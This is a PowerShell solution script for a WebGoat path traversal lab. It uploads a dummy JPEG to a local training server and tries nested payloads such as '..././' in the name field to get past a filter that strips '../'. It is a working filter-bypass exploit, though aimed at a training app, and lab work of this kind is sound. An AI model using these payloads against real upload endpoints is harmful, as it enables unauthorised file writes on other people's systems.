# Path Traversal - Bypass Filter Solution

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Path Traversal - Bypass ../  Filter" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Paste JSESSIONID:" -ForegroundColor White
$sessionId = Read-Host

Write-Host ""
Write-Host "Creating test image file..." -ForegroundColor Cyan

$testFile = "C:\Users\mahad\scripts\test.jpg"
$jpegBytes = [byte[]](0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xD9)
[System.IO.File]::WriteAllBytes($testFile, $jpegBytes)

Write-Host "Created test.jpg" -ForegroundColor Green
Write-Host ""
Write-Host "Testing bypass techniques for ../ filter..." -ForegroundColor Cyan
Write-Host ""

# Bypass payloads that work after "../" is removed
$payloads = @(
    @{name="Nested ../ bypass"; value="..././PathTraversal"; desc="..././ → ../ after removing ../"},
    @{name="Double nested"; value="....//PathTraversal"; desc="....// → ../ after filter"},
    @{name="Triple nested"; value="..././..././PathTraversal"; desc="Multiple levels"}
)

foreach($payload in $payloads) {
    Write-Host "Trying: $($payload.name)" -ForegroundColor Yellow
    Write-Host "  Payload: $($payload.value)" -ForegroundColor Gray
    Write-Host "  Logic: $($payload.desc)" -ForegroundColor Gray
    
    try {
        $response = curl.exe -s -X POST "http://localhost:8001/WebGoat/PathTraversal/profile-upload-fix" `
            -H "Cookie: JSESSIONID=$sessionId" `
            -H "X-Requested-With: XMLHttpRequest" `
            -F "uploadedFileFix=@$testFile" `
            -F "fullNameFix=$($payload.value)" `
            -F "email=test@test.com" `
            -F "password=test" 2>$null | ConvertFrom-Json
        
        if ($response.lessonCompleted -eq $true) {
            Write-Host ""
            Write-Host "SUCCESS!" -ForegroundColor Green
            Write-Host ""
            Write-Host "Lesson completed!" -ForegroundColor Green
            Write-Host "Feedback: $($response.feedback)" -ForegroundColor White
            Write-Host ""
            Write-Host "Working bypass:" -ForegroundColor Cyan
            Write-Host "  Technique: $($payload.name)" -ForegroundColor White
            Write-Host "  Payload: fullName=$($payload.value)" -ForegroundColor White
            Write-Host "  Explanation: $($payload.desc)" -ForegroundColor White
            
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
            exit 0
        } else {
            Write-Host "  Result: $($response.feedback)" -ForegroundColor Gray
        }
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

Write-Host "None of the payloads worked." -ForegroundColor Red

Remove-Item $testFile -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
